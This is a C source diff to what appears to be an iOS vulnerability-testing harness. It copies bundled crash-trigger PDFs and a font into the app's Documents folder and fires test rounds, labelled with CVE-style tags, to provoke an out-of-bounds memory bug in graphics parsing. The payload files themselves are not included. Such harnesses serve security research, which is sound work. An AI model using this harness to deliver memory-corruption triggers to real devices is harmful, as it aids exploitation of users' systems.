@@ -25,6 +25,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/stat.h>
+#include <mach-o/dyld.h>
 #include <time.h>
 #include <stdarg.h>
 
@@ -73,6 +74,43 @@ static const char *home_documents(void)
     if (!home || !*home) home = "/var/mobile";
     snprintf(docs, sizeof(docs), "%s/Documents", home);
     return docs;
+}
+
+/* stage the in-bundle payloads into Documents so the rounds find them
+   (the cg_decode_pure pattern: _NSGetExecutablePath -> dirname -> copy) */
+static void stage_payloads(void)
+{
+    char exePath[1024];
+    uint32_t exeLen = sizeof(exePath);
+    if (_NSGetExecutablePath(exePath, &exeLen) != 0) return;
+    char exeCopy[1024];
+    snprintf(exeCopy, sizeof(exeCopy), "%s", exePath);
+    char *appDirFile = NULL;
+    /* dirname */
+    char *last = NULL;
+    for (char *c = exeCopy; *c; c++) if (*c == '/') last = c;
+    if (!last) return;
+    *last = 0;
+    const char *appDir = exeCopy;
+    const char *docsDir = home_documents();
+    const char *payloads[] = {
+        "payload_crash_type5_v2.pdf",  "crash_shading_type5_v2.pdf",
+        "payload_control_type5_v2.pdf","control_shading_type5_v2.pdf",
+        "payload_crash_type5.pdf",     "crash_shading_type5.pdf",
+        "payload_trigger_cg.pdf",      "trigger_cg.pdf",
+        "payload_trigger.ttf",         "trigger.ttf",
+        NULL
+    };
+    for (const char **sp = payloads; *sp; sp += 2) {
+        char src[1280], dst[1280];
+        snprintf(src, sizeof(src), "%s/%s", appDir, *sp);
+        snprintf(dst, sizeof(dst), "%s/%s", docsDir, *(sp + 1));
+        struct stat st;
+        if (stat(src, &st) == 0) {
+            file_copy(src, dst);
+        }
+    }
+    rlinef("staged payload files from the bundle into Documents");
 }
 
 static int file_copy(const char *src, const char *dst)
@@ -210,10 +248,13 @@ int main(void)
 {
     report_open();
     rlinef("cg86950_pure boot");
+    stage_payloads();
 
+    fire_round("crash_shading_type5_v2.pdf", "round CVE-112611-PDF-v2");
+    fire_round("control_shading_type5_v2.pdf", "round CVE-112611-CTRL-v2");
+    fire_round("crash_shading_type5.pdf", "round CVE-112611-PDF-v1");
     fire_round("trigger_cg.pdf", "round CVE-86950-PDF");
-    fire_round("trigger.ttf",    "round CVE-86950-TTF");
-    fire_round("oc_4097x4097.h264", "round CVE-86950-H264(noise ref)");
+    fire_round("trigger.ttf", "round CVE-86950-TTF");
     fire_direct_round();
 
     rline("cg86950_pure DONE (process alive at the end = the OOB did not fire loudly)");
